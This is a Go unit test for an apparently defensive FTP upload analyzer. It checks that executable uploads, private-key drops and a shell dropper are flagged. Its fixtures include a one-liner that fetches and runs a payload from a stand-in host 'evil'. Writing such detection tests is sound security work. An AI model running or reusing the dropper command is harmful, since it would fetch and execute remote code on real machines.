package handler

import (
	"bytes"
	"testing"
)

func TestFTPAnalyzeUpload(t *testing.T) {
	// ELF dropped into an anonymous-writable path: checksums + ELF/exec/anon flags.
	elf := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, bytes.Repeat([]byte{0}, 64)...)
	res := Result{Meta: map[string]any{}}
	ftpAnalyzeUpload(&res, "/pub/x86", elf)
	for _, k := range []string{"ftp_upload_md5", "ftp_upload_sha1", "ftp_upload_sha256"} {
		if s, _ := res.Meta[k].(string); s == "" {
			t.Errorf("checksum %s missing: %v", k, res.Meta)
		}
	}
	for _, a := range []string{"ftp-elf-upload", "ftp-executable-upload", "ftp-anon-writable-drop"} {
		if !hasAnom(res, a) {
			t.Errorf("missing %q: %v", a, res.Meta["anomalies"])
		}
	}

	// Windows PE upload.
	res = Result{Meta: map[string]any{}}
	ftpAnalyzeUpload(&res, "/home/user/a.exe", append([]byte("MZ"), bytes.Repeat([]byte{0}, 64)...))
	if !hasAnom(res, "ftp-pe-upload") || !hasAnom(res, "ftp-executable-upload") {
		t.Errorf("PE flags missing: %v", res.Meta["anomalies"])
	}

	// Private-key material into /incoming.
	res = Result{Meta: map[string]any{}}
	ftpAnalyzeUpload(&res, "/incoming/id_rsa", []byte("-----BEGIN OPENSSH PRIVATE KEY-----\nb3Blb\n-----END OPENSSH PRIVATE KEY-----\n"))
	if !hasAnom(res, "ftp-keymaterial-upload") || !hasAnom(res, "ftp-anon-writable-drop") {
		t.Errorf("key-material flags missing: %v", res.Meta["anomalies"])
	}

	// Shell dropper one-liner.
	res = Result{Meta: map[string]any{}}
	ftpAnalyzeUpload(&res, "/tmp/s.sh", []byte("#!/bin/sh\nwget http://evil/x -O /tmp/x; chmod +x /tmp/x; /tmp/x\n"))
	if !hasAnom(res, "ftp-script-dropper-upload") {
		t.Errorf("dropper flag missing: %v", res.Meta["anomalies"])
	}

	// Benign text into a normal path: checksums only, no threat flags.
	res = Result{Meta: map[string]any{}}
	ftpAnalyzeUpload(&res, "/home/bob/notes.txt", []byte("just some meeting notes"))
	if hasAnom(res, "ftp-executable-upload") || hasAnom(res, "ftp-anon-writable-drop") {
		t.Errorf("benign upload wrongly flagged: %v", res.Meta["anomalies"])
	}
}
